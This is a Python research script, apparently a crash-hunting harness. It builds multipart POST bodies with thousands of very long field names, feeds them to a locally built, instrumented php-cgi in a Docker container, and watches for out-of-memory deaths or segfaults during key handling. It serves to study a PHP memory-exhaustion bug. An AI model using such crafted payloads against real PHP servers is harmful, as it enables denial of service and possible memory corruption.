#!/usr/bin/env python3
"""oom33: key-size race — make the key ask the largest fresh per-cycle alloc.
NAMELEN sweep; key ask ~ NAMELEN+26 must exceed refill 4096 and temporaries.
Detector: keycommit with no following keyok (post-commit death) or RC 139.
usage: oom33.py [len_start] [len_end] [step]
"""
import re
import subprocess
import sys

BIN = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"
LIMIT = 20_800_000
KEY_PARTS = 4200


def make_builder(namelen):
    def build():
        ps = []
        for i in range(KEY_PARTS):
            head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (namelen - 8) +
                    (b"%d" % i) + b'[x]"\r\n\r\n')
            ps.append(head + b"v\r\n")
        ps.append(b"--BOUND--\r\n")
        return b"".join(ps)
    return build


def run(body, limit):
    subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", "cat > /tmp/body.bin"],
                   input=body, capture_output=True, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%d -d post_max_size=4096M -d max_input_vars=100000 "
           "</tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", cmd % (len(body), BIN, limit)],
                       capture_output=True, timeout=300)
    tr = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "cat /tmp/e.log /tmp/o.log"],
                        capture_output=True).stdout.decode("latin1")
    return r.stdout.decode().strip(), tr


def decode(namelen, build):
    rc, tr = run(build(), LIMIT)
    commits = [(m.start(), m.group(2), m.group(3))
               for m in re.finditer(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", tr)]
    ok_positions = [m.start() for m in re.finditer(r"TRACE keyok", tr)]
    last = commits[-1] if commits else None
    key_death = last is not None and not any(p > last[0] for p in ok_positions)
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    rcnum = rc.replace("RC=", "")
    if key_death or rcnum == "139":
        i = tr.rfind("TRACE keycommit")
        print("len=%d rc=%s *** KEY DEATH elem=%s free=%s tried=%s ***" %
              (namelen, rcnum, last[1], last[2], tried[-1] if tried else "-"), flush=True)
        print(tr[max(0, i - 500):i + 300])
        print("---")
        return True
    tag = "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive"
    print("len=%d rc=%s %s commits=%d oks=%d" %
          (namelen, rcnum, tag, len(commits), len(ok_positions)), flush=True)
    return False


if __name__ == "__main__":
    l0 = int(sys.argv[1]) if len(sys.argv) > 1 else 3990
    l1 = int(sys.argv[2]) if len(sys.argv) > 2 else 24000
    step = int(sys.argv[3]) if len(sys.argv) > 3 else 4000
    for namelen in range(l0, l1 + 1, step):
        if decode(namelen, make_builder(namelen)):
            break
